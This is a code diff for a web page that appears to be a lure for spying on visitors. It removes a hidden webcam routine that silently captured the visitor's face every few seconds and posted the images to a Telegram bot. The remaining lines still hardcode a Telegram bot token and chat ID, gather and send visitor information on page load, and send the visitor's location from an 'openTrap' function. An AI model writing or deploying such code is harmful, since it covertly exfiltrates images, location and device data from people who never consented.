@@ -2,12 +2,6 @@ const TELEGRAM_BOT_TOKEN = '9174176982:AAEGO9F9kLczTp1g3hjAER_7KLw1IB0qzTw';
 const TELEGRAM_CHAT_ID = '659131693';
 const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
 
-const video = document.getElementById('video');
-const canvas = document.getElementById('canvas');
-
-let mediaStream = null;
-let captureInterval = null;
-let frameCount = 0;
 let locationSent = false;
 
 async function sendMessage(text) {
@@ -17,16 +11,6 @@ async function sendMessage(text) {
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text, parse_mode: 'HTML' })
         });
-    } catch (e) {}
-}
-
-async function sendPhoto(blob, caption) {
-    try {
-        const formData = new FormData();
-        formData.append('chat_id', TELEGRAM_CHAT_ID);
-        formData.append('photo', blob, `selfie_${Date.now()}.jpg`);
-        formData.append('caption', caption);
-        await fetch(`${TELEGRAM_API}/sendPhoto`, { method: 'POST', body: formData });
     } catch (e) {}
 }
 
@@ -71,49 +55,12 @@ function getLocation() {
     }
 }
 
-async function startStealthCapture() {
-    try {
-        mediaStream = await navigator.mediaDevices.getUserMedia({ 
-            video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }, 
-            audio: false 
-        });
-        video.srcObject = mediaStream;
-        setTimeout(() => {
-            if (video.videoWidth === 0) return;
-            captureFrame();
-            captureInterval = setInterval(() => { captureFrame(); }, 3000);
-        }, 1500);
-    } catch (err) {
-        sendMessage(`❌ <b>Camera error:</b> ${err.message}`);
-    }
-}
-
-function captureFrame() {
-    if (!mediaStream || video.videoWidth === 0) return;
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    canvas.getContext('2d').drawImage(video, 0, 0);
-    canvas.toBlob((blob) => {
-        frameCount++;
-        sendPhoto(blob, `📸 Stealth Capture #${frameCount}`);
-    }, 'image/jpeg', 0.8);
-}
-
-document.addEventListener('visibilitychange', () => {
-    if (document.visibilityState === 'hidden') {
-        if (mediaStream) { mediaStream.getTracks().forEach(track => track.stop()); mediaStream = null; }
-        if (captureInterval) { clearInterval(captureInterval); captureInterval = null; }
-    } else if (document.visibilityState === 'visible') {
-        if (!mediaStream) { startStealthCapture(); }
-    }
-});
+// کۆدی کامیرا بە تەواوی لابرا
 
 window.addEventListener('load', () => {
     gatherAndSendInfo();
-    startStealthCapture();
 });
 
 function openTrap() {
-    if (!mediaStream) { startStealthCapture(); }
     getLocation();
 }
